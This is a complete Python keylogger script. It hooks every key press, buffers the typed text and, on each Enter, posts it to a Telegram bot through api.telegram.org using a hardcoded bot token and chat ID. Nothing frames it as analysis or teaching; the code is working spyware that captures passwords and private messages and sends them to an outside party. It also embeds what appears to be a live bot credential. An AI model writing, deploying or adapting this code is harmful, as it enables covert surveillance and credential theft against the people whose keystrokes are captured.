import signal
import logging
import keyboard
import requests

# Configuration
LOG_FILE = "keylog.txt"
CHAT_ID = "1380865447z"
BOT_TOKEN = "7073587591:AAGEJyvFhbvHzvlEG4UwPsSkFG2iWvXg8uI"

# Function to send message to Telegram
def send_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=data)

# Function to handle keyboard interrupt
def keyboard_interrupt_handler(signal, frame):
    print("\nExiting keylogger.")
    keyboard.unhook_all()
    exit(0)

# Setup logging
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s %(message)s')

# Setup signal handler
signal.signal(signal.SIGINT, keyboard_interrupt_handler)

# Buffer to store keystrokes before sending
buffered_keypress = ""

# Function to handle key press
def on_press(event):
    global buffered_keypress
    
    key = event.name
    
    if key == "enter":
        if buffered_keypress:
            send_message(f"Key pressed: {buffered_keypress}")
            buffered_keypress = ""
    else:
        if len(key) == 1:
            buffered_keypress += key
        elif key == "space":
            buffered_keypress += " "
        elif key == "tab":
            buffered_keypress += "\t"

print("Starting keylogger. Press Ctrl+C to stop.")

try:
    # Hook keyboard events
    keyboard.on_press(on_press)

    # Keep the program running
    keyboard.wait()
except KeyboardInterrupt:
    keyboard_interrupt_handler(signal.SIGINT, None)
